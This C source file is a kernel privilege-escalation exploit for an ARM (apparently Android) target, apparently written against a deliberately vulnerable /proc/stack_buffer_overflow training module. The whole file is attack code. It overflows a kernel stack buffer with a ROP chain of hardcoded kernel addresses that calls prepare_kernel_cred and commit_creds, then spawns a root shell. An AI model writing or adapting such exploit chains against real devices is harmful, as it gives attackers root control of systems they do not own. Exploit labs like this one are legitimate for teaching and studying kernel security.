#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/mman.h>

#define MAX  64

int
open_file(void)
{
        int fd = open("/proc/stack_buffer_overflow", O_RDWR);
        if (fd == -1)
                err(1, "open");
        return fd;
}

void
payload(void)
{        
        if (getuid() == 0) {
                write(1, "start\n", 6);
                execl("/system/bin/sh", "sh", NULL);
                write(1, "over\n", 5);
        } else {
                warnx("failed to get root. How did we even get here?");
        }

        _exit(0);
}

void
trigger_vuln(int fd)
{

        #define MAX_PAYLOAD (MAX + 2 * sizeof(void*) + 0x68)

        char buf[MAX_PAYLOAD];
        int i;

        memset(buf, 'B', sizeof(buf));
        int * pc = buf + MAX; //+ sizeof(void*);

        *pc++ = 0xc011afac;
        *pc++ = 0xC00B8D68;                       // ; mov r0, #0; pop {r4, pc}
        *pc++ = 0x41424344;                                // r4
        *pc++ = 0xC00430F4;                       // ; prepare_kernel_cred(0)     -> pop {r3-r5, pc}
        *pc++ = 0x41424344;                                // r3
        *pc++ = 0x41424344;                                // r4
        *pc++ = 0x41424344;                                // r5
        *pc++ = 0xC0042BFC;                       // ; commit_creds   -> pop {r4-r6, pc}
        *pc++ = 0x170;                                // r4
        *pc++ = 0xc0026328;                                // r5
        *pc++ = 0x41424344;                                // r6
        *pc++ = 0xc018f8e8;                          // add sp, sp, #0x30; pop {r4, r5, r6, pc};
        *pc++ = 0x170;                                // r4
        *pc++ = 0xc0026328;                                // r5
        *pc++ = 0x41424344;                                // r6
        for (i=0; i < 13; i++) {
                *pc++  = 0xc000df90;        
        }
        /* Kaboom! */
        write(fd, buf, sizeof(buf) );
}

int
main(void)
{
        int fd;

        fd = open_file();
        trigger_vuln(fd);
        payload();
        /* If we're here, we've failed. */
        close(fd);

        errx("[-] exploit failed\n");
}
